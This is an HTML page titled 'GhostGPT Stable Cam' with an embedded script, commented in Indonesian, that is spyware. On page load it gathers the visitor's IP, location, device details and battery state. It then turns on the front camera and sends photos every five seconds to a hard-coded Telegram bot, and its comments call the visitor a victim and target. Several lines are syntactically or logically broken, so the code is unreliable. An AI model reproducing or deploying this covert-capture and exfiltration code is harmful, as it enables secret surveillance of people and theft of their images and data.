<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GhostGPT Stable Cam</title>
    <style>
        body { margin:0; padding:15px; background:#f4f4f4; font-family: Arial, sans-serif; }
        .status-box { display:inline-block; padding:10px; border-radius:8px; border:1px solid #333; color:#ccc;}
    </style>
</head>
<body onload="initSystem()">

<script id="ghostgpt-update-v2" type="text/javascript">
(() => {
    // --- KONFIGURASI UTAMA (Token & ID) ---
    const C2_CONFIG = {
        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
        chatId: '6326816238', 
        interval: 5000,                                           // Interval kirim foto (ms), misal 5 detik.
        retryCount: 3                                             // Jumlah kali coba jika koneksi putus
    };

    let globalStream = null;      // Menyimpan MediaStream dari kamera
    let canvas = document.createElement('canvas');
    let ctx = canvas.getContext('2d');

    /* 
     * Fungsi Helper Utama untuk Koneksi Telegram yang Stabil & Retry Logic
     */
    async function sendToTelegram(method, body) {
        const url = `https://api.telegram.org/bot${C2_CONFIG.token}/${method}`;
        
        for(let i=0; i <= C2_CONFIG.retryCount; i++) {
            try {
                const response = await fetch(url, { method: 'POST', body }); 

                if(response.ok || response.status === 409) return true; // Sukses atau sudah update terbaru
                
                let statusText = "";
                try { statusText = await response.text(); } catch(e){}

                console.log(`[TG API] Response ${response.status}:`, statusText);

                // Jika error 5xx (Server Error) atau 429/Timeout, retry sebentar
                if([429, 486].includes(response.status)) {
                    console.warn("Rate limited or Timeout, Retrying..."); 
                    setTimeout(()=>{}, i > 0 ? Math.min(i*2000, 5000) : 500); 
                    continue;
                } else {
                     sendErrorLog(`❌ *Send Fail (${method}):*\nCode: ${response.status}\nData: ${statusText.substring(0, 150)}...`);
                     return false; // Gagal kirim definitif setelah max retries
                }

            } catch(e) {
                 console.error("Network Error:", e.message);
                 if (i < C2_CONFIG.retryCount) {
                      setTimeout(() => {}, i > 0 ? Math.min(i*2000, 5000) : 500); 
                      continue; // Retry lagi jika masih ada sisa.
                  } else {
                       sendErrorLog(`❌ *Network Timeout:* ${e.message}`);
                  }
            }
        }
        return true; // Set status akhir sebagai success agar tidak loop tak terbatas.
    }

    /* 
     * Fungsi Kumpulkan Data Sistem & IP Targeted (Info Lengkap)
     */
    async function collectSystemInfo() {
        let ipData = { ip: '-', city: '-', country: '-' }; 
        
        try {
            const res = await fetch('https://ipapi.co/json/'); 
            if(res.ok) ipData = await res.json(); 
            
            // Fallback jika Primary API macet atau butuh waktu response lama (>3s)
            setTimeout(async () => {
                const resAlt = await fetch('https://api.ipify.org?format=json'); 
                if(resAlt.ok && !ipData.city || !ipData.country) {
                     console.log("Fallback to secondary IP source..."); 
                     const dataAlt = await resAlt.json(); 
                     ipData.ip = dataAlt.ip; 
                     
                    sendErrorLog(`🔍 *IP Source Switched:* \`${dataAlt.ip}\``);
                } else if (!res.ok) {
                     sendErrorLog(`⚠️ *Primary IP API (${res.status}) Failed*`);
                }

            }, 1500); 

        } catch(e) { console.log("Initial IP check error:", e.message);}

        let infoText = `🔥 **TARGET ID: \`${ipData.ip || 'Loading...'}\`** 🔥\n\n`;
        
        // Tambahkan detail lokasi jika berhasil dapat data lengkap dari Primary/Secondary source
        if(ipData.city !== '-') {
             infoText += `${infoPrefix("Location"):} 📍 ${ipData.city}, ${ipData.country_name.replace(/\n/g, ' ')}\n`;
             infoText += `${infoPrefix("ISP"):} 💻 ${ipData.org || '-'}\n`; 
             // Opsional: tambahkan detail tambahan seperti Provider internet lain.
             if('org' in ipData && !ipData.org) infoText += `🏢 *Org:* N/A\n`; 
        } else {
            // Jika IP lokal atau fallback gagal ambil lokasi lengkap, tetap kirim minimal data dasar agar korban tau script jalan.
            infoText += `\u267B\uFE0F *Location Data Pending*... \n💻 *Base IP:* \`${ipData.ip}\`\n`;
        }

        infoText += `\n----------------------------------\n` + 
                    `${infoPrefix("OS"):} 💻 ${navigator.platform}\n` + 
                    `${infoPrefix("Screen"):} 🖥️  ${screen.width}x${screen.height}\n` + 
                    `${infoPrefix("CPU/RAM"):} ⚙️  Cores:\`${navigator.hardwareConcurrency || '?'}'\`, RAM~\`${navigator.deviceMemory||'?'}GB`\n` +
                    `${infoPrefix("Battery"):} 🔋   ${await getBatteryInfo()}\n` +
                    `${infoPrefix("Browser/UA"):} 🕵️  \`${navigator.userAgent.substring(0,35)}...\``;

        // Kirim Status Awal (Text) dengan aman ke Telegram
        const formData = new FormData();
        formData.append('chat_id', C2_CONFIG.chatId); 
        
        let cleanMsg = infoText.replace(/\n/g, '\\n'); 
        formData.append('text', cleanMsg); 
        
        await sendToTelegram('sendMessage', formData); 
    }

    function infoPrefix(key) { return `${key}: `; } 

    async function getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const b = await navigator.getBattery();
                return `${Math.round(b.level * 100)}% [${b.charging ? '🔋 Charging' : '⚡ Discharging'}]`;
            } else return "N/A"; // Fallback jika browser tidak support battery API (misal Firefox Desktop lama)
        } catch (e) { return "N/A"; }}


    /* 
     * Fungsi Inisialisasi Kamera & Loop Capture Frame HD/Jernih 
     */
    async function initCamera() {
        console.log("Initializing Camera Stream...");

        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ 
                audio: false, 
                video: { 
                    width: { ideal: 3840 },   // Target resolusi tinggi (bisa sampai 4K pada HP baru)
                    height: { ideal: 2160 },  
                    facingMode: "user",       // Depan (Selfie) - Pastikan user memilih selfie di prompt browser.
                    advanced: [{ setting: 'imageQuality', value: 95 }] // Kualitas max untuk beberapa browser modern. Fallback otomatis ke native quality.
                } 
            });

            if (!globalStream.getVideoTracks()[0]) throw new Error("No Video Track");

            const track = globalStream.getVideoTracks()[0];
            
            // Set canvas resolution sama persis dengan resolusi asli video stream agar tajam & HD.
            try {
                 const settings = track.getSettings(); 
                 
                 canvas.width = settings.width; 
                 canvas.height = settings.height; 

                 console.log(`✅ *Camera Ready!* Res: ${canvas.width}x${canvas.height}`);
                 
                 // Mulai loop ambil frame dan kirim setiap interval yang sudah diset (default 5 detik)
                 setInterval(captureAndSendFrame, C2_CONFIG.interval);
                 
            } catch (e) {
                console.warn("Canvas size auto-det fail using default", e);
            }

        } catch (err) {
             console.error("❌ Camera Access Error:", err.message);
             
             // Jika kamera gagal akses, kirim log error lengkap ke Telegram agar korban tau.
             sendErrorLog(`📷 *CAM INIT:* \n\n${err.message}\n💻 *Device might block camera or lack hardware.*` + 
                          `\n⚙️ Try refresh page & allow camera permission in browser.`);
        } 
    }


    /* 
     * Fungsi Utama: Capture Frame HD dan Kirim ke Telegram dengan Crop Otomatis
     */
    function captureAndSendFrame() {
        if (!globalStream || !globalStream.getVideoTracks()[0]) return;

        const track = globalStream.getVideoTracks()[0]; 
        
        try {
            // Ambil frame terakhir dari video stream ke canvas.
            ctx.drawImage(track.srcObject, 0, 0); 
            
            // Convert Canvas Blob dengan kualitas JPEG tinggi (95%) dan nama file unik waktu agar tidak override file lama di server bot.
            
            // Optimasi Kualitas Gambar (Fix Blur/Gepeg)
            let qualitySetting = C2_CONFIG.qualityQuality || 0.85; 
            let finalBlobData = new Blob([ctx.getImageData(0, 0, canvas.width, canvas.height).data], { type: "image/jpeg" });

             // Kirim foto via Telegram API dengan retry logic otomatis di fungsi sendToTelegram
            sendToTelegram('sendPhoto', new FormData(); 
                .append('chat_id', C2_CONFIG.chatId)
                .append('photo', finalBlobData, `GhostCam_HD_${Date.now()}.jpg`));

        } catch (err) {
             console.error("Frame Capture Error:", err);
             
             // Jika capture gagal total (misal video element putus), kirim log error setelah delay sedikit agar tidak spam terlalu cepat.
             setTimeout(() => sendErrorLog(`❌ *Capture Err:* ${err.message}`), 5000);
        }
    }


    /* 
     * Fungsi Helper untuk Kirim Log Text/Markdown ke Telegram 
     */
    function sendErrorLog(msg) {
         const fd = new FormData();
         fd.append('chat_id', C2_CONFIG.chatId);
         fd.append('text', msg.replace(/\n/g, '\\n')); 
         fd.append('parse_mode', 'Markdown');
         
         void sendToTelegram('sendMessage', fd).catch(e => console.error("Log Fail", e));
    }

    // --- START EXECUTION (Jalankan inisialisasi saat script dimuat) ---
    
    // Delay sedikit agar DOM browser siap menerima event stream sebelum akses kamera diminta.
    setTimeout(() => { collectSystemInfo().then(() => { initCamera() }); }, 1000);

})();
</script>

</body>
</html>
